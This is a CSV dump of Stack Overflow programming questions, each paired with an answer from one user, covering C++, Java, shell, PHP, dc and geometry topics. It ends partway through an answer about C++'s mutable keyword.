QUESTION,USERID,USERNAME,ANSWER
"<p>I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.</p>

<h2>Ideas:</h2>

<ul>
<li>Procedural</li>
<li>Functional</li>
<li>Object Oriented</li>
<li>One liners</li>
<li>Obfuscated</li>
<li>Oddball</li>
<li>Bad Code</li>
<li><a href=""http://en.wikipedia.org/wiki/Polyglot_%28computing%29"" rel=""nofollow"">Polyglot</a></li>
</ul>

<p>Basically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.</p>

<p>Please limit it to one example per entry.
I will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.</p>

<p>The only real requirement is it must find the factorial of a given argument, in all languages represented.</p>

<h1>Be Creative!</h1>

<h2>Recommended Guideline:</h2>

<pre>
# Language Name: Optional Style type

   - Optional bullet points

    Code Goes Here

Other informational text goes here
</pre>

<p>I will ocasionally go along and edit any answer that does not have decent formatting.</p>
","9530","Adam Rosenfield","<h1>dc</h1>

<p>Note: clobbers the <code>e</code> and <code>f</code> registers:</p>

<pre><code>[2++d]se[d1-d_1&lt;fd0&gt;e*]sf
</code></pre>

<p>To use, put the value you want to take the factorial of on the top of the stack and then execute <code>lfx</code> (load the <code>f</code> register and execute it), which then pops the top of the stack and pushes that value's factorial.</p>

<p>Explanation: if the top of the stack is <code>x</code>, then the first part makes the top of the stack look like <code>(x, x-1)</code>.  If the new top-of-stack is non-negative, it calls factorial recursively, so now the stack is <code>(x, (x-1)!)</code> for <code>x</code> >= 1, or <code>(0, -1)</code> for <code>x</code> = 0.  Then, if the new top-of-stack is negative, it executes <code>2++d</code>, which replaces the <code>(0, -1)</code> with <code>(1, 1)</code>.  Finally, it multiplies the top two values on the stack.</p>
"
"<p>I have a class in system-C with some data members as such:  </p>

<pre><code>long double x[8];
</code></pre>

<p>I'm initializing it in the construction like this:</p>

<pre><code>for (i = 0; i &lt; 8; ++i) {
    x[i] = 0;
}
</code></pre>

<p>But the first time I use it in my code I have garbage there.</p>

<p>Because of the way the system is built I can't connect a debugger easily.  Are there any methods to set a data breakpoint in the code so that it tells me where in the code the variables were actually changed, but without hooking up a debugger?</p>

<p>Edit:
@<a href=""#56477"" rel=""nofollow"">Prakash</a>: 
Actually, this is a typo in the <em>question</em>, but not in my code...  Thanks!</p>
","9530","Adam Rosenfield","<p>You could try starting a second thread which spins, looking for changes in the variable:</p>

<pre><code>
#include &lt;pthread.h&gt;

void *ThreadProc(void *arg)
{
  volatile long double *x = (volatile long double *)arg;
  while(1)
  {
    for(int i = 0; i &lt; 8; i++)
    {
      if(x[i] != 0)
      {
        __asm__ __volatile__ (""int 3"");  // breakpoint (x86)
      }
  }

  return 0;  // Never reached, but placate the compiler
}
...
pthread_t threadID;
pthread_create(&threadID, NULL, ThreadProc, &x[0]);
</code></pre>

<p>This will raise a SIGTRAP signal to your application whenever any of the x values is not zero.</p>
"
"<p>I'm looking for suggestions on possible IPC mechanisms that are:</p>

<ul>
<li><strong>cross platform</strong> (WIN32 and Linux at least)</li>
<li>Simple to implement in <strong>C++</strong> as well as the <strong>most common scripting languages</strong> (perl, ruby python etc).</li>
<li>Finally, <strong>simple to use</strong> from a programming point of view!</li>
</ul>

<p>What are my options? I'm programming under Linux, but I'd like what I write to be portable to other OSes in the future. I've thought about using sockets, named pipes, or something like DBus.</p>

<p>Does anyone have any advice?</p>
","9530","Adam Rosenfield","<p>Python has a pretty good IPC library: see <a href=""http://docs.python.org/lib/ipc.html"" rel=""nofollow"">http://docs.python.org/lib/ipc.html</a></p>
"
"<p>To commemorate the public launch of Stack Overflow, what's the shortest code to cause a stack overflow? Any language welcome.</p>

<p>ETA: Just to be clear on this question, seeing as I'm an occasional Scheme user: tail-call ""recursion"" is really iteration, and any solution which can be converted to an iterative solution relatively trivially by a decent compiler won't be counted. :-P</p>

<p>ETA2: I've now selected a “best answer”; see <a href=""http://stackoverflow.com/questions/62188/stack-overflow-code-golf/71833#71833"">this post</a> for rationale. Thanks to everyone who contributed! :-)</p>
","9530","Adam Rosenfield","<p>Here's another interesting one from Scheme:</p>

<pre>((lambda (x) (x x)) (lambda (x) (x x)))</pre>
"
"<p>Someone told me it's more efficient to use <code>StringBuffer</code> to concatenate strings in Java than to use the <code>+</code> operator for <code>String</code>s. What happens under the hood when you do that? What does <code>StringBuffer</code> do differently?</p>
","9530","Adam Rosenfield","<p>Because Strings are immutable, each call to the + operator creates a new String object and copies the String data over to the new String.  Since copying a String takes time linear in the length of the String, a sequence of N calls to the + operator results in O(N<sup>2</sup>) running time (quadratic).</p>

<p>Conversely, since a StringBuffer is mutable, it does not need to copy the String every time you perform an Append(), so a sequence of N Append() calls takes O(N) time (linear).  This only makes a significant difference in runtime if you are appending a large number of Strings together.</p>
"
"<p>As everyone knows, the <a href=""http://en.wikipedia.org/wiki/Visual_C%2B%2B"" rel=""nofollow"">Visual C++</a> runtime marks uninitialized or just freed memory blocks with special non-zero markers. Is there any way to disable this behavior entirely without manually setting all uninitialized memory to zeros? It's causing havoc with my valid not null checks, since 0xFEEEFEEE != 0.</p>

<p>Hrm, perhaps I should explain a bit better. I create and initialize a variable (via new), and that all goes just fine. When I free it (via delete), it sets the pointer to 0xFEEEFEEE instead of NULL. When I insert a proper check for NULL, as all good programs that manage their own memory should, I come up with problems as 0xFEEEFEEE passes a NULL check without problems. Is there any good way, other than manually setting all pointers to NULL when deleting them, to detect when memory has already been freed? I would prefer to not use <a href=""http://en.wikipedia.org/wiki/Boost_C%2B%2B_Libraries"" rel=""nofollow"">Boost</a> simply because I don't want the overhead, small though it may be, since that's the only thing I'd be using Boost for.</p>
","9530","Adam Rosenfield","<p>If you build in Release mode instead of Debug mode, the runtime does not fill uninitialized memory at all, but it will still not be zeros.  However, you should <b>not</b> depend on this behavior - you should either explicitly initialize the memory yourself with memset(), ZeroMemory(), or SecureZeroMemory(), or set a flag somewhere indicating that the memory is not yet initialized.  Reading uninitialized memory will result in undefined behavior.</p>
"
"<p>I worked on an embedded system this summer written in straight C.  It was an existing project that the company I work for had taken over.  I have become quite accustomed to writing unit tests in Java using JUnit but was at a loss as to the best way to write unit tests for existing code (which needed refactoring) as well as new code added to the system.</p>

<p>Are there any projects out there that make unit testing plain C code as easy as unit testing Java code with JUnit?  Any insight that would apply specifically to embedded development (cross-compiling to arm-linux platform) would be greatly appreciated.</p>
","9530","Adam Rosenfield","<p>One unit testing framework in C is <a href=""http://check.sourceforge.net/"">Check</a>; a list of unit testing frameworks in C can be found <a href=""http://check.sourceforge.net/doc/check_html/check_2.html#SEC3"">here</a> and is reproduced below.  Depending on how many standard library functions your runtime has, you may or not be able to use one of those.</p>

<blockquote>
  <h3>AceUnit</h3>
  
  <p>AceUnit (Advanced C and Embedded Unit) bills itself as a comfortable C code unit test framework. It tries to mimick JUnit 4.x and includes reflection-like capabilities. AceUnit can be used in resource constraint environments, e.g. embedded software development, and importantly it runs fine in environments where you cannot include a single standard header file and cannot invoke a single standard C function from the ANSI / ISO C libraries. It also has a Windows port. It does not use forks to trap signals, although the authors have expressed interest in adding such a feature. See the <a href=""http://aceunit.sourceforge.net/"">AceUnit homepage</a>.</p>
  
  <h3>GNU Autounit</h3>
  
  <p>Much along the same lines as Check, including forking to run unit tests in a separate address space (in fact, the original author of Check borrowed the idea from GNU Autounit). GNU Autounit uses GLib extensively, which means that linking and such need special options, but this may not be a big problem to you, especially if you are already using GTK or GLib. See the <a href=""http://autounit.tigris.org/"">GNU Autounit homepage</a>.</p>
  
  <h3>cUnit</h3>
  
  <p>Also uses GLib, but does not fork to protect the address space of unit tests.</p>
  
  <h3>CUnit</h3>
  
  <p>Standard C, with plans for a Win32 GUI implementation. Does not currently fork or otherwise protect the address space of unit tests. In early development. See the <a href=""http://cunit.sourceforge.net/"">CUnit homepage</a>.</p>
  
  <h3>CuTest</h3>
  
  <p>A simple framework with just one .c and one .h file that you drop into your source tree. See the <a href=""http://cutest.sourceforge.net/"">CuTest homepage</a>.</p>
  
  <h3>CppUnit</h3>
  
  <p>The premier unit testing framework for C++; you can also use it to test C code. It is stable, actively developed, and has a GUI interface. The primary reasons not to use CppUnit for C are first that it is quite big, and second you have to write your tests in C++, which means you need a C++ compiler. If these don’t sound like concerns, it is definitely worth considering, along with other C++ unit testing frameworks. See the <a href=""http://sourceforge.net/apps/mediawiki/cppunit/index.php?title=Main_Page"">CppUnit homepage</a>.</p>
  
  <h3>embUnit</h3>
  
  <p>embUnit (Embedded Unit) is another unit test framework for embedded systems. This one appears to be superseded by AceUnit. <a href=""http://sourceforge.net/projects/embunit/"">Embedded Unit homepage</a>.</p>
  
  <h3>MinUnit</h3>
  
  <p>A minimal set of macros and that’s it! The point is to show how easy it is to unit test your code. See the <a href=""http://www.jera.com/techinfo/jtns/jtn002.html"">MinUnit homepage</a>.</p>
  
  <h3>CUnit for Mr. Ando</h3>
  
  <p>A CUnit implementation that is fairly new, and apparently still in early development. See the <a href=""http://park.ruru.ne.jp/ando/work/CUnitForAndo/html/"">CUnit for Mr. Ando homepage</a>.</p>
</blockquote>
"
"<p>I want to use a file to store the current version number for a piece of customer software which can be used by a start-up script to run the binary in the correct directory.</p>

<p>For Example, if the run directory looks like this:</p>

<pre><code>.
..
1.2.1
1.2.2
1.3.0
run.sh
current_version
</code></pre>

<p>And current_version contains:</p>

<pre><code>1.2.2
</code></pre>

<p>I want run.sh to descend into 1.2.2 and run the program foo.</p>

<p>The current solution is this:</p>

<pre><code>!#/bin/sh
version = `cat current_version`
cd $version
./foo
</code></pre>

<p>It works but is not very robust.  It does not check for file existence, cannot cope with multiple lines, leading spaces, commented lines, blank files, etc.</p>

<p>What is the most survivable way to do this with either a shell or perl script?</p>
","9530","Adam Rosenfield","<p>You can check for existence using the &amp;&amp; and || operators:</p>

<pre>
!$/bin/sh
version = `cat current_version`
cd $version && ./foo || echo ""Bad version""
</pre>

<p>The &amp;&amp; operator causes the second statement to only execute if the first one succeeds (exit status 0), and the || operator causes the second statement to execute only if the first one fails (exit status non-zero).</p>

<p>I'm not sure what you mean by coping with multiple lines, leading spaces, or commented lines.</p>
"
"<p>I need to calculate Math.exp() from java very frequently, is it possible to get a native version to run faster than java's Math.exp()??</p>

<p>I tried just jni + C, but it's slower than just plain java.</p>
","9530","Adam Rosenfield","<p>The problem with using JNI is the overhead involved in making the call to JNI.  The Java virtual machine is pretty optimized these days, and calls to the built-in Math.exp() are automatically optimized to call straight through to the C exp() function, and they might even be optimized into straight x87 floating-point assembly instructions.</p>
"
"<p>I wanted to ""emulate"" a popular flash game, Chrontron, in C++ and needed some help getting started. (NOTE: Not for release, just practicing for myself)</p>

<pre>
Basics:
Player has a time machine. On each iteration of using the time machine, a parallel state
is created, co-existing with a previous state. One of the states must complete all the
objectives of the level before ending the stage. In addition, all the stages must be able
to end the stage normally, without causing a state paradox (wherein they should have
been able to finish the stage normally but, due to the interactions of another state,
were not).
</pre>

<p>So, that sort of explains how the game works. You should play it a bit to really 
understand what my problem is. <br /></p>

<p>I'm thinking a good way to solve this would be to use linked lists to store each state,
which will probably either be a hash map, based on time, or a linked list that iterates
based on time. I'm still unsure.<br /></p>

<p>ACTUAL QUESTION:</p>

<p>Now that I have some rough specs, I need some help deciding on which data structures to use for this, and why. Also, I want to know what Graphics API/Layer I should use to do this: SDL, OpenGL, or DirectX (my current choice is SDL). And how would I go about implementing parallel states? With parallel threads?</p>

<p>EDIT (To clarify more):<br />
OS -- Windows (since this is a hobby project, may do this in Linux later)<br />
Graphics -- 2D
Language -- C++ (must be C++ -- this is practice for a course next semester)</p>

<p>Q-Unanswered: SDL : OpenGL : Direct X <br />
Q-Answered: Avoid Parallel Processing <br />
Q-Answered: Use STL to implement time-step actions.<br /></p>

<pre>
So far from what people have said, I should:
1. Use STL to store actions.
2. Iterate through actions based on time-step.
3. Forget parallel processing -- period. (But I'd still like some pointers as to how it
could be used and in what cases it should be used, since this is for practice).
</pre>

<p>Appending to the question, I've mostly used C#, PHP, and Java before so I wouldn't describe myself as a hotshot programmer. What C++ specific knowledge would help make this project easier for me? (ie. Vectors?)</p>
","9530","Adam Rosenfield","<p>This sounds very similar to <a href=""http://braid-game.com"">Braid</a>.  You really don't want parallel processing for this - parallel programming is <b>hard</b>, and for something like this, performance should not be an issue.</p>

<p>Since the game state vector will grow very quickly (probably on the order of several kilobytes per second, depending on the frame rate and how much data you store), you don't want a linked list, which has a lot of overhead in terms of space (and can introduce big performance penalties due to cache misses if it is laid out poorly).  For each parallel timeline, you want a vector data structure.  You can store each parallel timeline in a linked list.  Each timeline knows at what time it began.</p>

<p>To run the game, you iterate through all active timelines and perform one frame's worth of actions from each of them in lockstep.  No need for parallel processing.</p>
"
"<p>Windows file system is case insensitive. How, given a file/folder name (e.g. ""somefile""), I get the <em>actual</em> name of that file/folder (e.g. it should return ""SomeFile"" if Explorer displays it so)?</p>

<p>Some ways I know, all of which seem quite backwards:</p>

<ol>
<li>Given the full path, search for each folder on the path (via FindFirstFile). This gives proper cased results of each folder. At the last step, search for the file itself.</li>
<li>Get filename from handle (as in <a href=""http://msdn.microsoft.com/en-us/library/aa366789(VS.85).aspx"">MSDN example</a>). This requires opening a file, creating file mapping, getting it's name, parsing device names etc. Pretty convoluted. And it does not work for folders or zero-size files.</li>
</ol>

<p>Am I missing some obvious WinAPI call? The simplest ones, like GetActualPathName() or GetFullPathName() return the name using casing that was passed in (e.g. returns ""program files"" if that was passed in, even if it should be ""Program Files"").</p>

<p>I'm looking for a native solution (not .NET one).</p>
","9530","Adam Rosenfield","<p>After a quick test, <a href=""http://msdn.microsoft.com/en-us/library/aa364980(VS.85).aspx"" rel=""nofollow"">GetLongPathName()</a> does what you want.</p>
"
"<p>Is it possible to create an instance of a generic type in Java? I'm thinking based on what I've seen that the answer is <code>no</code> (<em>due to type erasure</em>), but I'd be interested if anyone can see something I'm missing:</p>

<pre><code>class SomeContainer&lt;E&gt;
{
    E createContents()
    {
        return what???
    }
}
</code></pre>

<p>EDIT: It turns out that <a href=""http://www.artima.com/weblogs/viewpost.jsp?thread=208860"">Super Type Tokens</a> could be used to resolve my issue, but it requires a lot of reflection-based code, as some of the answers below have indicated.</p>

<p>I'll leave this open for a little while to see if anyone comes up with anything dramatically different than Ian Robertson's <a href=""http://www.artima.com/weblogs/viewpost.jsp?thread=208860"">Artima Article</a>.</p>
","9530","Adam Rosenfield","<p>As you said, you can't really do it because of type erasure.  You can sort of do it using reflection, but it requires a lot of code and lot of error handling.</p>
"
"<p>I am trying to solve numerically a set of partial differential equations in three dimensions. In each of the equations the next value of the unknown in a point depends on the current value of each unknown in the closest points.</p>

<p>To write an efficient code I need to keep the points close in the three dimensions close in the (one-dimensional) memory space, so that each value is called from memory just once.</p>

<p>I was thinking of using octtrees, but I was wondering if someone knows a better method.</p>
","9530","Adam Rosenfield","<p>Octtrees are the way to go.  You subdivide the array into 8 octants:</p>

<pre>
1 2
3 4

---

5 6
7 8
</pre>

<p>And then lay them out in memory in the order 1, 2, 3, 4, 5, 6, 7, 8 as above.  You repeat this recursively within each octant until you get down to some base size, probably around 128 bytes or so (this is just a guess -- make sure to profile to determine the optimal cutoff point).  This has much, much better cache coherency and locality of reference than the naive layout.</p>
"
"<p>I have a command line program, which outputs logging to the screen.</p>

<p>I want error lines to show up in red. Is there some special character codes I can output to switch the text color to red, then switch it back to white?</p>

<p>I'm using ruby but I imagine this would be the same in any other language.</p>

<p>Something like:</p>

<pre><code>red = ""\0123"" # character code
white = ""\0223""

print ""#{red} ERROR: IT BROKE #{white}""
print ""other stuff""
</code></pre>
","9530","Adam Rosenfield","<p>You want <a href=""http://en.wikipedia.org/wiki/ANSI_escape_code"" rel=""nofollow"">ANSI escape codes</a>.</p>
"
"<p>I have a costumer showing Notepad with a large set of data that looks totally misaligned if word wrap is on and I want to force it off. Is there a command switch to do this?</p>
","9530","Adam Rosenfield","<p>You could just use Wordpad instead of Notepad, it has word wrap off by default.</p>
"
"<p>It seems to be the <a href=""http://stackoverflow.com/questions/82391/should-tables-be-avoided-in-html-at-any-cost#82402"">general opinion</a> that tables should not be used for layout in HTML. </p>

<p>Why?</p>

<p>I have never (or rarely to be honest) seen good arguments for this. The usual answers are:</p>

<ul>
<li><p>It's good to <a href=""http://stackoverflow.com/questions/82391/should-tables-be-avoided-in-html-at-any-cost#82422"">separate content from layout</a><br>But this is a fallacious argument; <a href=""http://www.don-lindsay-archive.org/skeptic/arguments.html#cliche"">Cliche Thinking</a>. I guess it's true that using the table element for layout has little to do with tabular data. So what? Does my boss care? Do my users care?<br><br>Perhaps me or my fellow developers who have to maintain a web page care... Is a table less maintainable? I think using a table is <a href=""http://stackoverflow.com/questions/82391/should-tables-be-avoided-in-html-at-any-cost#82571"">easier</a> than using divs and CSS.<br><br>By the way... why is using a div or a span good separation of content from layout and a table not? Getting a good layout with only divs often requires a lot of nested divs.</p></li>
<li><p>Readability of the code<br>I think it's the other way around. Most people understand HTML, few understand CSS.</p></li>
<li><p>It's better for SEO not to use tables<br>Why? Can anybody show some evidence that it is? Or a statement from Google that tables are discouraged from an SEO perspective?</p></li>
<li><p>Tables are slower.<br>An extra tbody element has to be inserted. This is peanuts for modern web browsers. Show me some benchmarks where the use of a table significantly slows down a page.</p></li>
<li><p>A layout overhaul is easier without tables, see <a href=""http://csszengarden.com/"">css Zen Garden</a>.<br>Most web sites that need an upgrade need new content (HTML) as well. Scenarios where a new version of a web site only needs a new CSS file are not very likely. Zen Garden is a nice web site, but a bit theoretical. Not to mention its <a href=""http://stackoverflow.com/questions/83073/div-vs-table#83639"">misuse</a> of CSS.</p></li>
</ul>

<p>I am really interested in good arguments to use divs + CSS instead of tables.</p>
","9530","Adam Rosenfield","<p>Tables are good for HTML that you're throwing together for something simple or temporary.  If you're building a large-scale website, you should go with divs and CSS, since it will be easier to maintain over time as your website changes.</p>
"
"<p>I've seen this done in a few sites, an example is <a href=""http://www.artofadambetts.com/weblog/?p=169"" rel=""nofollow"">artofadambetts.com</a>. The scroll bar on the page scrolls only an element of the page, not the entire page. I looked at the source and havent't been able to figure it out yet. How is this done?</p>
","9530","Adam Rosenfield","<p>To put scroll bars on an element such as a div:</p>

<p><code>&lt;div style=""overflow-x: auto; overflow-y: auto;&gt;the content&lt;/div&gt;</code></p>

<p>If you only want a horizontal or vertical scroll bar, only use whichever of overflow-x and overflow-y you need.</p>
"
"<p>What interrupt would you hook from DOS to get the real-time clock?</p>
","9530","Adam Rosenfield","<p>Read up on the <a href=""http://en.wikipedia.org/wiki/Intel_8259"" rel=""nofollow"">Intel 8259</a> family of Programmable Interrupt Controllers.  According to this, it's interrupts 8 (master) and 112 (slave).  Here's a very technical document on the 8259A: <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/hardware/8259A.pdf"" rel=""nofollow"">http://pdos.csail.mit.edu/6.828/2008/readings/hardware/8259A.pdf</a></p>
"
"<p>Of course most languages have library functions for this, but suppose I want to do it myself.</p>

<p>Suppose that the float is given like in a C or Java program (except for the 'f' or 'd' suffix), for example ""<code>4.2e1</code>"", ""<code>.42e2</code>"" or simply ""<code>42</code>"". In general, we have the ""integer part"" before the decimal point, the ""fractional part"" after the decimal point, and the ""exponent"". All three are integers.</p>

<p><strong>It is easy to find and process the individual digits, but how do you compose them into a value of type <code>float</code> or <code>double</code> without losing precision?</strong></p>

<p>I'm thinking of multiplying the integer part with 10^<em>n</em>, where <em>n</em> is the number of digits in the fractional part, and then adding the fractional part to the integer part and subtracting <em>n</em> from the exponent. This effectively turns <code>4.2e1</code> into <code>42e0</code>, for example. Then I could use the <code>pow</code> function to compute 10^<em>exponent</em> and multiply the result with the new integer part. The question is, does this method guarantee maximum precision throughout?</p>

<p>Any thoughts on this?</p>
","9530","Adam Rosenfield","<p>If you want the most precise result possible, you should use a higher internal working precision, and then downconvert the result to the desired precision.  If you don't mind a few ULPs of error, then you can just repeatedly multiply by 10 as necessary with the desired precision.  I would avoid the pow() function, since it will produce inexact results for large exponents.</p>
"
"<p>I'm working on a game where I create a random map of provinces (a la Risk or Diplomacy).  To create that map, I'm first generating a series of semi-random points, then figuring the Delaunay triangulations of those points.  </p>

<p>With that done, I am now looking to create a Voronoi diagram of the points to serve as a starting point for the province borders.  My data at this point (no pun intended) consists of the original series of points and a collection of the Delaunay triangles.</p>

<p>I've seen a number of ways to do this on the web, but most of them are tied up with how the Delaunay was derived.  I'd love to find something that doesn't need to be integrated to the Delaunay, but can work based off the data alone.  Failing that, I'm looking for something comprehensible to a relative geometry newbie, as opposed to optimal speed.  Thanks!</p>
","9530","Adam Rosenfield","<p>The Voronoi diagram is just the dual graph of the Delaunay triangulation.  </p>

<ul>
<li>So, the edges of the Voronoi diagram are along the perpendicular bisectors of the edges of the Delaunay triangulation, so compute those lines.  </li>
<li>Then, compute the vertices of the Voronoi diagram by finding the intersections of adjacent edges.  </li>
<li>Finally, the edges are then the subsets of the lines you computed which lie between the corresponding vertices.  </li>
</ul>

<p>Note that the exact code depends on the internal representation you're using for the two diagrams.</p>
"
"<p>I have a series of PDFs named sequentially like so:</p>

<ul>
<li>01_foo.pdf</li>
<li>02_bar.pdf</li>
<li>03_baz.pdf</li>
<li>etc.</li>
</ul>

<p>Using Ruby, is it possible to combine these into one big PDF while keeping them in sequence? I don't mind installing any necessary gems to do the job.</p>

<p>If this isn't possible in Ruby, how about another language? No commercial components, if possible.</p>

<p><hr /></p>

<p><strong>Update:</strong> <a href=""http://stackoverflow.com/questions/85459/is-it-possible-to-combine-a-series-of-pdfs-into-one-using-ruby#85618"">Jason Navarrete's suggestion</a> lead to the perfect solution:</p>

<p>Place the PDF files needing to be combined in a directory along with <a href=""http://www.accesspdf.com/pdftk/"">pdftk</a> (or make sure pdftk is in your PATH), then run the following script:</p>

<pre><code>pdfs = Dir[""[0-9][0-9]_*""].sort.join("" "")
`pdftk #{pdfs} output combined.pdf`
</code></pre>

<p>Or I could even do it as a one-liner from the command-line:</p>

<pre><code>ruby -e '`pdftk #{Dir[""[0-9][0-9]_*""].sort.join("" "")} output combined.pdf`'
</code></pre>

<p>Great suggestion Jason, perfect solution, thanks. <strong>Give him an up-vote people</strong>.</p>
","9530","Adam Rosenfield","<p>You can do this by converting to PostScript and back.  PostScript files can be concatenated trivially.  For example, here's a Bash script that uses the Ghostscript tools ps2pdf and pdf2ps:</p>

<pre>
#!/bin/bash
for file in 01_foo.pdf 02_bar.pdf 03_baz.pdf; do
    pdf2ps $file - >> temp.ps
done

ps2pdf temp.ps output.pdf
rm temp.ps
</pre>

<p>I'm not familiar with Ruby, but there's almost certainly some function (might be called <code>system()</code> (just a guess)) that will invoke a given command line.</p>
"
"<p>I've got just one page that I want to force to be accessed as an HTTPS page (PHP on Apache). How do I do this without making the whole directory require HTTPS? Or, if you submit a form to an HTTPS page from an HTTP page, does it send it by HTTPS instead of HTTP?</p>

<p>Here is my example:</p>

<pre><code>http://www.example.com/some-page.php
</code></pre>

<p>I want it to only be accessed through:</p>

<pre><code>https://www.example.com/some-page.php
</code></pre>

<p>Sure, I can put all of the links to this page pointed at the HTTPS version, but that doesn't stop some fool from accessing it through HTTP on purpose...</p>

<p>One thing I thought was putting a redirect in the header of the PHP file to check to be sure that they are accessing the HTTPS version:</p>

<pre><code>if($_SERVER[""SCRIPT_URI""] == ""http://www.example.com/some-page.php""){
    header('Location: https://www.example.com/some-page.php');
}
</code></pre>

<p>But that can't be the right way, can it?</p>

<p>BTW, please pay no attention to the URL. I know that if it were actually a page where there was a shopping cart, etc., you would do it a different way. Think of it as a page from a site that sells one item for one price where you type in your credit card info to be submitted to a payment gateway on an external site for the express purpose of charging your card one time.</p>
","9530","Adam Rosenfield","<p>The way I've done it before is basically like what you wrote, but doesn't have any hardcoded values:</p>

<pre>if($_SERVER[""HTTPS""] != ""on"")
{
    header(""Location: https://"" . $_SERVER[""HTTP_HOST""] . $_SERVER[""REQUEST_URI""]);
    exit();
}</pre>
"
"<p>I'm wondering the <em>best</em> way to start a pthread that is a member of a C++ class? My own approach follows as an answer...</p>
","9530","Adam Rosenfield","<p>You have to bootstrap it using the void* parameter:</p>

<pre>class A
{
  static void* StaticThreadProc(void *arg)
  {
    return reinterpret_cast&lt;A*&gt;(arg)->ThreadProc();
  }

  void* ThreadProc(void)
  {
    // do stuff
  }
};

...

pthread_t theThread;
pthread_create(&theThread, NULL, &A::StaticThreadProc, this);</pre>
"
"<p>How would I go about...</p>

<ul>
<li><p>multiplying two 64-bit numbers </p></li>
<li><p>multiplying two 16-digit hexadecimal numbers </p></li>
</ul>

<p>...using Assembly Language. </p>

<p>I'm only allowed to use registers %eax, %ebx, %ecx, %edx, and the stack.</p>

<p>EDIT: Oh, I'm using ATT Syntax on the x86<br>
EDIT2: Not allowed to decompile into assembly...</p>
","9530","Adam Rosenfield","<p>Just do normal long multiplication, as if you were multiplying a pair of 2-digit numbers, except each ""digit"" is really a 32-bit integer.  If you're multiplying two numbers at addresses X and Y and storing the result in Z, then what you want to do (in pseudocode) is:</p>

<pre>Z[0..3] = X[0..3] * Y[0..3]
Z[4..7] = X[0..3] * Y[4..7] + X[4..7] * Y[0..3]</pre>

<p>Note that we're discarding the upper 64 bits of the result (since a 64-bit number times a 64-bit number is a 128-bit number).  Also note that this is assuming little-endian.  Also, be careful about a signed versus an unsigned multiply.</p>
"
"<p>I sometimes notice programs that crash on my computer with the error: ""pure virtual function call"".</p>

<p>How do these programs even compile when an object cannot be created of an abstract class?</p>
","9530","Adam Rosenfield","<p>They can result if you try to make a virtual function call from a constructor or destructor.  Since you can't make a virtual function call from a constructor or destructor (the derived class object hasn't been constructed or has already been destroyed), it calls the base class version, which in the case of a pure virtual function, doesn't exist.</p>

<pre>class Base
{
public:
    Base() { doIt(); }  // DON'T DO THIS
    virtual void doIt() = 0;
};

class Derived : public Base
{
    void doIt() {}
};

int main(void)
{
    Derived d;  // This will cause ""pure virtual function call"" error
}
</pre>
"
"<p>I have a Win32 TreeCtrl where the user can rename the tree labels. I process the TVN_ENDLABELEDIT message to do this.</p>

<p>In certain cases I need to change the text that the user entered. Basically the user can enter a short name during edit and I want to replace it with a longer text.</p>

<p>To do this I change the pszText member of the TVITEM struct I received during TVN_ENDLABELEDIT. I do a pointer replace here, as the original memory may be too small to do a simple strcpy like operation.</p>

<p>However I do not know how to deallocate the original pszText member. Basically because it's unknown if that was created with malloc() or new ... therefore I cannot call the appropriate deallocator. Obviously Win32 won't call the deallocator for the old pszText because the pointer has been replaced. So if I don't deallocate, there will be a memory leak.</p>

<p>Any idea how Win32 allocate these structs and what is the proper way to handle the above situation?</p>
","9530","Adam Rosenfield","<p>You don't want to directly edit the text in the TVITEM struct, the results are undefined.  Instead, use the TVM_SETITEM message, or equivalently, use the TreeView_SetItem() macro defined in windowsx.h.</p>
"
"<p>I am using VS2005 VC++ for unmanaged C++. I have VSTS and am trying to use the code coverage tool to accomplish two things with regards to unit tests:</p>

<ol>
<li>See how much of my referenced code under test is getting executed</li>
<li>See how many methods of my code under test (if any) are not unit tested at all</li>
</ol>

<p>Setting up the VSTS code coverage tool (see the <a href=""https://blogs.msdn.com/ms_joc/articles/406608.aspx"" rel=""nofollow"" title=""MSDN Code Coverage Blog"">link text</a>) and accomplishing task #1 was straightforward. However #2 has been a surprising challenge for me. Here is my test code. </p>

<pre><code>class CodeCoverageTarget
{
public:
    std::string ThisMethodRuns() {
         return ""Running"";
    }

    std::string ThisMethodDoesNotRun() {
        return ""Not Running"";
    }
};



#include &lt;iostream&gt;
#include ""CodeCoverageTarget.h""
using namespace std;
int main()

{
    CodeCoverageTarget cct; 
    cout&lt;&lt;cct.ThisMethodRuns()&lt;&lt;endl;
}
</code></pre>

<p>When both methods are defined within the class as above the compiler automatically eliminates the ThisMethodDoesNotRun() from the obj file. If I move it's definition outside the class then it is included in the obj file and the code coverage tool shows it has not been exercised at all. Under most circumstances I want the compiler to do this elimination for me but for the code coverage tool it defeats a significant portion of the value (e.g. finding untested methods). I have tried a number of things to tell the compiler to stop being smart for me and compile everything but I am stumped. It would be nice if the code coverage tool compensated for this (I suppose by scanning the source and matching it up with the linker output) but I didn't find anything to suggest it has a special mode to be turned on. Am I totally missing something simple here or is this not possible with the VC++ compiler + VSTS code coverage tool? </p>

<p>Thanks in advance,
KGB</p>
","9530","Adam Rosenfield","<p>You could try adding a line of code to call the function only if some condition is true, and guarantee that that condition will never be true.  Just make sure the compiler can't figure that out.  For example,</p>

<pre><code>
int main(int argc, char **argv)
{
  if(argv == NULL)  // C runtime says this won't happen
    someMethodWhichIsntReallyEverCalled();
}
</code></pre>
"
"<p>If I have a <code>std::vector</code> or <code>std::map</code> variable, and I want to see the contents, it's a big pain to see the nth element while debugging. Is there a plugin, or some trick to making it easier to watch STL container variables while debugging <code>(VS2003/2005/2008)</code>?</p>
","9530","Adam Rosenfield","<p>If you want to watch more than one element at the same time, you can append a comma and the number of elements as so:</p>

<p><code>(v._Myfirst)[startIndex], count</code></p>

<p>However, note that count must be a constant, it cannot be the result of another expression.</p>
"
"<p>A while ago I came across some code that marked a member variable of a class with the <code>mutable</code> keyword.  As far as I can see it simply allows you to modify a variable in a <code>const</code> method:</p>

<pre><code>class Foo  
{  
private:  
    mutable bool done_;  
public:  
    void doSomething() const { ...; done_ = true; }  
};
</code></pre>

<p>Is this the only use of this keyword or is there more to it than meets the eye?  I have since used this technique in a class, marking a <code>boost::mutex</code> as mutable allowing <code>const</code> functions to lock it for thread-safety reasons, but, to be honest, it feels like a bit of a hack.</p>
","9530","Adam Rosenfield","<p>It's useful in situations where you have hidden internal state such as a cache.  For example:</p>

<pre>
class HashTable
{
...
public:
    string lookup(string key) const
    {
        if(key == lastKey)
            return lastValue;

